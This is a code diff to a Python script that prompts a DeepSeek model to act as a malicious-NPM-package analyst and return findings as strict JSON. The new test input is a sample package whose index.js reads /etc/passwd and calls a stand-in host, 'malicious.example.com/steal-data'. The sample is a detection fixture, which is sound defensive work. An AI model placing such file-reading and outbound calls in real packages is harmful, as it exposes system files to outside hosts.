@@ -27,18 +27,59 @@ def main():
 
     adapter = DeepSeekAdapter(config=config)
 
-    prompt = """You are a security analyst.
-                Given the following package info and a short snippet of code,
-                extract the package's semantic behavior in JSON with keys:
-                package_name, behaviors (list), suspicious_patterns (list),
-                evidence (dict), confidence (0-1). Return valid JSON only.
+    prompt = r"""
+            You are a cybersecurity expert specialized in analyzing NPM packages for malicious behavior.
+            You are given package metadata and a short JavaScript file. Your task is to FILL THE JSON SKELETON BELOW based ONLY on the provided files.
 
-                ===PACKAGE.JSON===
-                {"name": "example", "version":"1.0.0"}
+            IMPORTANT RULES — FOLLOW EXACTLY:
+            1) Return EXACTLY one JSON object, nothing else (no explanation, no markdown, no leading/trailing text).
+            2) The JSON keys MUST be exactly:
+            "package_name", "behaviors", "suspicious_patterns", "evidence", "confidence"
+            3) If there are no behaviors or patterns, return empty lists/dicts (do not write "null" or text).
+            4) Do NOT invent any extra keys or top-level fields.
+            5) Use conservative confidences: if unsure, choose a low confidence (e.g., 0.15-0.4).
+            6) The "confidence" field is a float in [0,1] summarizing aggregated confidence.
+            7) All behaviors MUST be objects with keys: "id", "category", "summary", "details", "confidence".
+            8) In "evidence" include { "file": "...", "line": N, "snippet": "..." } entries where applicable.
+            9) If you cannot find any suspicious behavior, return the skeleton with empty lists and confidence 0.0.
 
-                ===FILE: index.js===
-                console.log('hello world');
+            JSON SKELETON (fill values only):
+            {
+            "package_name": "",
+            "behaviors": [
+                /* Each item must be an object:
+                {
+                    "id": "b1",
+                    "category": "data_exfiltration|network_call|filesystem_access|code_exec|dependency_abuse|typosquatting|other",
+                    "summary": "",
+                    "details": "",
+                    "confidence": 0.0
+                }
+                */
+            ],
+            "suspicious_patterns": [
+                /* short strings describing detected suspicious code patterns, e.g. "reads /etc/passwd", "HTTP post to external domain" */
+            ],
+            "evidence": {
+                /* map filenames to evidence lists:
+                "index.js": [ { "line": 3, "snippet": "fs.readFileSync('/etc/passwd', 'utf-8')" } ]
+                */
+            },
+            "confidence": 0.0
+            }
+
+            Now analyze the package below and FILL the skeleton above exactly.
+
+            ===PACKAGE.JSON===
+            {"name": "example-malicious", "version":"1.0.0"}
+
+            ===FILE: index.js===
+            const fs = require('fs');
+            const https = require('https');
+            fs.readFileSync('/etc/passwd', 'utf-8');
+            https.get('http://malicious.example.com/steal-data', res => {});
             """
+
 
     t0 = time.time()
     out = adapter.generate(prompt, max_new_tokens=256)
